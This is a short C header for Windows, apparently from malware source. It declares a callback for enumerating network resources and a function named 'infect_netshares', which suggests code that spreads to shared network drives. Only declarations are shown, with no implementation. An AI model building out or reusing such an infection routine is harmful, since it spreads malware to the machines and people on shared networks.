#pragma once
#include <windows.h>
#include <stdio.h>
#include <winnetwk.h>

typedef bool (*tcallbacl_shares)(LPNETRESOURCEW lpnr,void *arg);
bool infect_netshares(tcallbacl_shares f, void *arg);